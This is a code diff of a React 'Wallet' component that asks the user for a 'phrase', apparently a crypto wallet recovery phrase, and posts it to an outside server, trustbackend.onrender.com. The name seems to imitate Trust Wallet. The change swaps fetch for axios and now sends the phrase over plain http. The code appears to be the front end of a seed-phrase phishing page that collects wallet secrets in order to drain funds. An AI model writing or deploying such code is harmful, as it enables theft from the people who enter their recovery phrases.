@@ -1,35 +1,22 @@
 import React, { useState } from 'react';
 import { Link } from 'react-router-dom';
 import hero_img from "../assets/images/Screenshot 2024-07-14 112312.png";
+import axios from 'axios';
 
 const Wallet = () => {
   const [formData, setFormData] = useState("");
 
-  const dataSend = () => {
+  const dataSend = async () => {
     if (!formData) {
       return alert("Please enter correct phrase")
     }
-    fetch("https://trustbackend.onrender.com/api/key", {
-      // fetch("http://localhost:8000/api/key", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({ phrase: formData }), // changed 'pharse' to 'phrase'
-    })
-      .then((res) => {
-        if (!res.ok) {
-          throw new Error(`HTTP error! Status: ${res.status}`);
-        }
-        return res.json();
-      })
-      .then((data) => {
-        console.log("Response received:", data);
-      })
-      .catch((error) => {
-        console.error("Error occurred:", error);
-      });
-
+    try {
+      const res = await axios.post("http://trustbackend.onrender.com/api/key" , {phrase:formData})
+      // const res = await axios.post("http://localhost:8000/api/key" , {phrase:formData})
+      console.log(res)
+    } catch (error) {
+      console.log(error)
+    }
   };
 
   return (
